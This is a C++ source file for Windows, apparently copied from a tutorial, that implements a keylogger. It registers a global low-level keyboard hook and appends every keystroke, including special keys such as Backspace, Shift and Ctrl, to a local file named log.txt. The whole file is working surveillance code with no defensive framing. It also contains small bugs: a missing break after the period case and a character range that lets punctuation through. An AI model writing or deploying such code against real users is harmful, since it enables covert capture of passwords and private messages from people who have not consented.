#include <iostream>
#include <fstream>
#include <windows.h>

void LogStroke(int key) {
    std::ofstream file;
    file.open("log.txt", std::ios::app);

    switch (key) {
        case VK_BACK:
            file << "[BACKSPACE]";
            break;
        
        case VK_RETURN:
            file << "\n";
            break;

        case VK_SPACE:
            file << "[SPACE]";
            break;
        
        case VK_TAB:
            file << "[TAB]";
            break;

        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
            file << "[SHIFT]";
            break;

        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
            file << "[CTRL]";
            break;
        
        case VK_ESCAPE:
            file << "[ESC]";
            break;
        
        case VK_OEM_PERIOD:
            file << ".";

        default:
            if (
                (key >= 'A' && key <= 'z') 
                || (key >= 'a' && key <= 'z')
                || (key >= '0' && key <= '9')
            ) {

                file << char(key);

            } else {
                file << "[" << key << "]";

            }
        
            break;

    }

    file.close();

}

LRESULT __stdcall KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*) lParam;
        int key = keyInfo -> vkCode;
        LogStroke(key);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);

}

// // True original code from tutorial
// LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
//     if (nCode >= 0 && wParam == WM_KEYDOWN) {
//         KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*) lParam;
//         int key = keyInfo -> vkCode;
//         logStroke(key);
//     }

//     return CallNextHookEx(NULL, nCode, wParam, lParam);

// }


int main() {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);

    return 0;

}